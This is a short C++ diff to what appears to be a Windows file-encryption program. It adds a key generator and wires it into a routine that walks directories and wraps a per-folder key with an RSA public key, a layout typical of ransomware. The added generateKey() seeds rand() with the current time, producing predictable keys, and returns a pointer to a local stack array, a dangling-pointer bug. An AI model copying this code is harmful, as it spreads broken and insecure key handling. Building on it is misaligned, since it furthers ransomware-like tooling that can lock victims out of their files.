@@ -1,6 +1,7 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include "fileEnc.hpp"
 #include <map>
+#include <ctime>
 
 
 // 사용자 이름 가져오기
@@ -10,6 +11,16 @@ string getUserName() {
 
     GetUserNameA(userName, &username_len);
     return userName;
+}
+
+
+unsigned char* generateKey() {
+    unsigned char _key[32];
+    srand(time(NULL));
+    for (int i = 0; i < 32; i++) {
+        _key[i] = rand();
+    }
+    return _key;
 }
 
 
@@ -60,10 +71,7 @@ void GetDecKey(RSA* priKey, string& dirName, unsigned char* key) {
 
 
 void EncryptDir(RSA* pubKey, string& dirName) {
-    unsigned char _key[32] = {0x00, }; // generateKey();
-    
-    cout << "pubKey in encrypt dir " << endl;
-    cout << pubKey << endl;
+    unsigned char* _key = generateKey();
 
     SaveEncKey(pubKey, dirName, _key);
 
@@ -77,7 +85,7 @@ void EncryptDir(RSA* pubKey, string& dirName) {
     cout << "\n\n ********** " + dirName + " **********" << endl;
     hFind = FindFirstFileA((dirName + "\\*").c_str(), &data);
 
-    if (hFind == INVALID_HANDLE_VALUE)return;
+    if (hFind == INVALID_HANDLE_VALUE) return;
 
     do {
         if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
@@ -173,7 +181,7 @@ void EncryptText(unsigned char* plain, unsigned int plainLength, unsigned char* 
 
 
 void DecryptDir(RSA* priKey, string& dirName) {
-    unsigned char _key[32] = { 0x02, };
+    unsigned char _key[32] = { 0x00, };
     GetDecKey(priKey, dirName, _key);
 
     WIN32_FIND_DATAA data;
